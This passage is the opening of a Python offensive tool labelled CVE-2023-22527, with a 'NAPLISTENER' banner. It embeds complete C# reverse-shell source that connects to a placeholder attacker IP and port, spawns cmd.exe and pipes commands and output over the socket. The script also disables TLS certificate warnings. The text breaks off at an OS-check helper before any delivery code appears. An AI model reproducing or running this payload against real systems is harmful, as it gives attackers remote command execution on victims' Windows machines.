#!/usr/bin/python3
import requests
import platform
import subprocess
import base64
import requests.utils
import urllib3
import argparse
import textwrap
import sys
from requests import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

logo = '''
 /$$   /$$  /$$$$$$  /$$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$
| $$$ | $$ /$$__  $$| $$__  $$| $$      |_  $$_/ /$$__  $$|__  $$__/| $$_____/| $$$ | $$| $$_____/| $$__  $$
| $$$$| $$| $$  \ $$| $$  \ $$| $$        | $$  | $$  \__/   | $$   | $$      | $$$$| $$| $$      | $$  \ $$
| $$ $$ $$| $$$$$$$$| $$$$$$$/| $$        | $$  |  $$$$$$    | $$   | $$$$$   | $$ $$ $$| $$$$$   | $$$$$$$/
| $$  $$$$| $$__  $$| $$____/ | $$        | $$   \____  $$   | $$   | $$__/   | $$  $$$$| $$__/   | $$__  $$
| $$\  $$$| $$  | $$| $$      | $$        | $$   /$$  \ $$   | $$   | $$      | $$\  $$$| $$      | $$  \ $$
| $$ \  $$| $$  | $$| $$      | $$$$$$$$ /$$$$$$|  $$$$$$/   | $$   | $$$$$$$$| $$ \  $$| $$$$$$$$| $$  | $$
|__/  \__/|__/  |__/|__/      |________/|______/ \______/    |__/   |________/|__/  \__/|________/|__/  |__/
                                                                                    CVE-2023-22527
'''

class Main:
    def __init__(self, args):
        # Initialize reverse shell code, from (https://revshells.com/)
        self.revshell = '''
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Reverse
{
    public class Run
    {
        // Declare a StreamWriter that will be used to write to the TCP stream
        static StreamWriter streamWriter;

        public Run()
        {
            // Create a new TCP client that connects to the specified IP and port
            using (TcpClient client = new TcpClient("@IP", @PORT))
            {
                // Get the TCP stream
                using (Stream stream = client.GetStream())
                {
                    // Create a StreamReader that reads from the TCP stream
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        // Initialize the StreamWriter with the TCP stream
                        streamWriter = new StreamWriter(stream);

                        // Create a StringBuilder to hold the input from the TCP stream
                        StringBuilder strInput = new StringBuilder();

                        // Create a new process that runs cmd
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;

                        // Attach an event handler to the process's OutputDataReceived event
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

                        // Start the process
                        p.Start();

                        // Begin asynchronously reading the standard output of the process
                        p.BeginOutputReadLine();

                        // While the process is running
                        while (true)
                        {
                            // Append the input from the TCP stream to the StringBuilder
                            strInput.Append(rdr.ReadLine());

                            // Write the input to the standard input of the process
                            p.StandardInput.WriteLine(strInput);

                            // Clear the StringBuilder
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            // Create a new instance of the Run class (reference: https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)
            new Run();
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // Create a StringBuilder to hold the output from the process
            StringBuilder strOutput = new StringBuilder();

            // If the output is not null or empty
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // Append the output to the StringBuilder
                    strOutput.Append(outLine.Data);

                    // Write the output to the TCP stream and flush the stream
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
'''

    def __check_os(self):
        os_type = platform.system()
        if os_type == 'Windows': return 'Windows'
        elif os_type == 'Linux': return 'Linux'
        else:
            print("[?] Unknown OS Version")
            return False
    
    